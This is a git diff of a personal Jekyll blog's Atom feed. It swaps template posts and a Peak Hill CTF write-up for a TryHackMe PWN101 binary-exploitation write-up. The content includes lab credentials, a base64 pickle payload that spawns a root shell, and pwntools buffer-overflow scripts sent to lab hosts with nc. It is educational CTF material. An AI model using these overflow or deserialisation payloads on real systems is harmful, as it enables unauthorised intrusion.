@@ -1,262 +1,1660 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/new_blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/new_blog/" rel="alternate" type="text/html" /><updated>2022-04-03T17:02:29+00:00</updated><id>http://localhost:4000/new_blog/feed.xml</id><title type="html">The Awesome Blog</title><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/new_blog/posts/welcome-to-jekyll/" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2022-04-03T07:43:47+00:00</published><updated>2022-04-03T07:43:47+00:00</updated><id>http://localhost:4000/new_blog/posts/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/welcome-to-jekyll/">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/new_blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/new_blog/" rel="alternate" type="text/html" /><updated>2022-05-07T15:23:51+00:00</updated><id>http://localhost:4000/new_blog/feed.xml</id><title type="html">The Awesome Blog</title><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><entry><title type="html">Pwn101 Tryhackme</title><link href="http://localhost:4000/new_blog/posts/PWN101-Tryhackme/" rel="alternate" type="text/html" title="Pwn101 Tryhackme" /><published>2022-04-29T00:00:00+00:00</published><updated>2022-04-29T00:00:00+00:00</updated><id>http://localhost:4000/new_blog/posts/PWN101-Tryhackme</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/PWN101-Tryhackme/"><![CDATA[<blockquote>
+  <p>Void XD</p>
+</blockquote>
 
-&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+<p>This is short writup for <a href="https://tryhackme.com/room/pwn101">PWN101</a> (Beginner level binary exploitation challenges.) on <a href="https://tryhackme.com">tryhackme</a>
+Go check it out.</p>
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+<h2 id="challenge-1---pwn101">Challenge 1 - pwn101</h2>
 
-&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+<p>This should give you a start: ‘AAAAAAAAAAA’</p>
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+<p>Challenge is running on port 9001</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file check</span>
 
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Cool</title><link href="http://localhost:4000/new_blog/posts/Cool/" rel="alternate" type="text/html" title="Cool" /><published>2022-04-03T00:00:00+00:00</published><updated>2022-04-03T00:00:00+00:00</updated><id>http://localhost:4000/new_blog/posts/Cool</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/Cool/">&lt;h1 id=&quot;peak_hill&quot;&gt;Peak_Hill&lt;/h1&gt;
+file pwn101.pwn101 
+pwn101.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
 
-&lt;blockquote&gt;
-  &lt;table&gt;
-    &lt;tbody&gt;
-      &lt;tr&gt;
-        &lt;td&gt;VOiD&lt;/td&gt;
-        &lt;td&gt;Monday 27 December 2021 06:21:19 AM UTC&lt;/td&gt;
-      &lt;/tr&gt;
-    &lt;/tbody&gt;
-  &lt;/table&gt;
-&lt;/blockquote&gt;
 
-&lt;p&gt;My IP : 10.8.253.221
-Target IP : 10.10.54.223&lt;/p&gt;
+checksec pwn101.pwn101 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall1/pwn101.pwn101'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
 
-&lt;h3 id=&quot;rustscan&quot;&gt;Rustscan&lt;/h3&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Open 10.10.136.101:22
-Open 10.10.136.101:21
-Open 10.10.136.101:7321
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<span class="nb">chmod</span> +x pwn101.pwn101
 
-&lt;h2 id=&quot;port-21-ftp&quot;&gt;PORT 21 [FTP]&lt;/h2&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;creds
-test.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<span class="c"># Executing binary to find more</span>
 
-&lt;h2 id=&quot;port-7321-&quot;&gt;PORT 7321 []&lt;/h2&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc 10.10.136.101 7321
-username:?
-password:?
+./pwn101.pwn101
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 101          
 
-python3 ape.py | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;user | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 4
-gherkin
-&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;real_creds | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 4 
-p1ckl3s_@11_@r0und_th3_w0rld
+Hello!, I am going to shopping.
+My mom told me to buy some ingredients.
+Ummm.. But I have low memory capacity, So I forgot most of them.
+Anyway, she is preparing Briyani <span class="k">for </span>lunch, Can you <span class="nb">help </span>me to buy those items :D
 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+Type the required ingredients to make briyani: 
+<span class="nb">test
+</span>Nah bruh, you lied me :<span class="o">(</span>
+She did Tomato rice instead of briyani :/
 
-&lt;h2 id=&quot;port-22-ssh&quot;&gt;PORT 22 [ssh]&lt;/h2&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gherkin:p1ckl3s_@11_@r0und_th3_w0rld
+So it needs some special input.
+</code></pre></div></div>
 
-ps auxf
-dill      1104  0.2  2.4 187884 12236 ?        Ssl  11:56   0:01 /usr/bin/python3 /var/cmd/.cmd_service.py
+<p>Using ghidra to get the source code</p>
 
-scp gherkin@10.10.54.223:/cmd_service.pyc &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn101.png" alt="pwn101.png" /></p>
 
-https://www.decompiler.com/ 
-gives the decompile version
+<p>Here we can clearly see its checking if preset_value is 1337 if its not so we get shell.</p>
 
-dill
-n3v3r_@_d1ll_m0m3nt
+<p>So the objective is to rewrite preset_value to something other than 1337</p>
 
-dill@ubuntu-xenial:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
-f1e13335c47306e193212c98fc07b6a0
+<p>As we are taking input from gets which is a dangerous function as it dosent limit in user input</p>
 
-User dill may run the following commands on ubuntu-xenial:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
+<p>Entering more characters than the input_buffer accepts will overwrite the preset_value.</p>
 
-using ape3 
-gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARiYXNolIWUUpQu
+<p>Our exploit</p>
 
-root.txt :e88f0a01135c05cf0912cf4bc335ee28
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># simple pwntools script
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bin sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><summary type="html">Peak_Hill</summary></entry><entry><title type="html">Jekyll Markdown</title><link href="http://localhost:4000/new_blog/posts/jekyll-markdown/" rel="alternate" type="text/html" title="Jekyll Markdown" /><published>2021-11-04T00:00:00+00:00</published><updated>2021-11-04T00:00:00+00:00</updated><id>http://localhost:4000/new_blog/posts/jekyll-markdown</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/jekyll-markdown/">&lt;p&gt;Text can be &lt;strong&gt;bold&lt;/strong&gt;, &lt;em&gt;italic&lt;/em&gt;, &lt;del&gt;strikethrough&lt;/del&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt;&lt;/p&gt;
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">100</span>
 
-&lt;p&gt;&lt;a href=&quot;./another-page.html&quot;&gt;Link to another page&lt;/a&gt;.&lt;/p&gt;
+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 
-&lt;p&gt;There should be whitespace between paragraphs.&lt;/p&gt;
+</code></pre></div></div>
 
-&lt;p&gt;There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.&lt;/p&gt;
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Running the exploit</span>
+<span class="o">(</span><span class="nb">cat </span>payload.txt<span class="p">;</span><span class="nb">cat</span><span class="o">)</span> | nc 10.10.206.5 9001
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 101          
 
-&lt;h4 id=&quot;image&quot;&gt;Image&lt;/h4&gt;
+Hello!, I am going to shopping.
+My mom told me to buy some ingredients.
+Ummm.. But I have low memory capacity, So I forgot most of them.
+Anyway, she is preparing Briyani <span class="k">for </span>lunch, Can you <span class="nb">help </span>me to buy those items :D
 
-&lt;p&gt;Images can be clicked to enlarge :) .&lt;/p&gt;
+Type the required ingredients to make briyani: 
 
-&lt;p&gt;&lt;img src=&quot;https://picsum.photos/800/300&quot; alt=&quot;Dummy Image&quot; /&gt;&lt;/p&gt;
+Thanks, Heres a small gift <span class="k">for </span>you &lt;3
 
-&lt;h1 id=&quot;header-1&quot;&gt;Header 1&lt;/h1&gt;
+<span class="nb">ls
+</span>flag.txt
+pwn101
+pwn101.c
+<span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
 
-&lt;p&gt;This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.&lt;/p&gt;
+</code></pre></div></div>
 
-&lt;h2 id=&quot;header-2&quot;&gt;Header 2&lt;/h2&gt;
+<h2 id="challenge-2---pwn102">Challenge 2 - pwn102</h2>
 
-&lt;blockquote&gt;
-  &lt;p&gt;This is a blockquote following a header.&lt;/p&gt;
+<p>The challenge is running on port 9002</p>
 
-  &lt;p&gt;When something is important enough, you do it even if the odds are not in your favor.&lt;/p&gt;
-&lt;/blockquote&gt;
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file checks</span>
 
-&lt;h3 id=&quot;header-3&quot;&gt;Header 3&lt;/h3&gt;
+file pwn102.pwn102 
+pwn102.pwn102: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>2612b87a7803e0a8af101dc39d860554c652d165, not stripped
 
-&lt;blockquote&gt;
-  &lt;p&gt;This is another blockquote following header 3&lt;/p&gt;
-&lt;/blockquote&gt;
+checksec pwn102.pwn102 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall2/pwn102.pwn102'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
 
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Javascript code with syntax highlighting.&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;dateformat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i18n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;./lang/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Ruby code with syntax highlighting&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;GitHubPages&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_dependency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;= &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<span class="c"># Executing binary to get more info</span>
+./pwn102.pwn102 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 102          
 
-&lt;h4 id=&quot;header-4&quot;&gt;Header 4&lt;/h4&gt;
+I need badf00d to fee1dead
+Am I right? <span class="nb">test
+</span>I<span class="s1">'m feeling dead, coz you said I need bad food :(
 
-&lt;ul&gt;
-  &lt;li&gt;This is an unordered list following a header.&lt;/li&gt;
-  &lt;li&gt;This is an unordered list following a header.&lt;/li&gt;
-  &lt;li&gt;This is an unordered list following a header.&lt;/li&gt;
-&lt;/ul&gt;
+</span></code></pre></div></div>
 
-&lt;h5 id=&quot;header-5&quot;&gt;Header 5&lt;/h5&gt;
+<p>Using ghidra again to decomplie the source code.</p>
 
-&lt;ol&gt;
-  &lt;li&gt;This is an ordered list following a header.&lt;/li&gt;
-  &lt;li&gt;This is an ordered list following a header.&lt;/li&gt;
-  &lt;li&gt;This is an ordered list following a header.&lt;/li&gt;
-&lt;/ol&gt;
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn102.png" alt="pwn102.png" /></p>
 
-&lt;h6 id=&quot;header-6&quot;&gt;Header 6&lt;/h6&gt;
+<p>This time there are two preset value with value 0xbadf00d and 0xfee1dead we have to rewrite them to 0xc0ff33 and 0xc0d3</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Using gdb to get the offset <span class="k">for </span>these comparisions
 
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;head1&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;head two&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;three&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;ok&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;good swedish fish&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;nice&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;out of stock&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;good and plenty&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;nice&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;ok&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;good &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oreos&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;hmm&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;ok&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;good &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zoute&lt;/code&gt; drop&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;yumm&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/PWN101/chall2]
+└─<span class="nv">$ </span>cyclic <span class="nt">-l</span> caab
+108
+                                                                                                                                                                                              
 
-&lt;h3 id=&quot;theres-a-horizontal-rule-below-this&quot;&gt;There’s a horizontal rule below this.&lt;/h3&gt;
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/PWN101/chall2]
+└─<span class="nv">$ </span>cyclic <span class="nt">-l</span> baab
+104
+</code></pre></div></div>
 
-&lt;hr /&gt;
+<p>Our exploit</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /chall2/get_shell.py
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-&lt;h3 id=&quot;here-is-an-unordered-list&quot;&gt;Here is an unordered list:&lt;/h3&gt;
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./pwn102.pwn102'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
 
-&lt;ul&gt;
-  &lt;li&gt;Item foo&lt;/li&gt;
-  &lt;li&gt;Item bar&lt;/li&gt;
-  &lt;li&gt;Item baz&lt;/li&gt;
-  &lt;li&gt;Item zip&lt;/li&gt;
-&lt;/ul&gt;
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
+</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
+</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
+</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
 
-&lt;h3 id=&quot;and-an-ordered-list&quot;&gt;And an ordered list:&lt;/h3&gt;
 
-&lt;ol&gt;
-  &lt;li&gt;Item one
-    &lt;ol&gt;
-      &lt;li&gt;Item one&lt;/li&gt;
-      &lt;li&gt;Item two
-        &lt;ol&gt;
-          &lt;li&gt;Item one&lt;/li&gt;
-          &lt;li&gt;Item two&lt;/li&gt;
-          &lt;li&gt;Item three&lt;/li&gt;
-        &lt;/ol&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Item three&lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Item four&lt;/li&gt;
-  &lt;li&gt;Item two&lt;/li&gt;
-  &lt;li&gt;Item three&lt;/li&gt;
-  &lt;li&gt;Item four&lt;/li&gt;
-&lt;/ol&gt;
+<span class="c1"># rbp - 4 = 108
+# rbp - 8 = 104
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">104</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc0d3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc0ff33</span><span class="p">)</span>
 
-&lt;h3 id=&quot;and-a-nested-list&quot;&gt;And a nested list:&lt;/h3&gt;
+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 
-&lt;ul&gt;
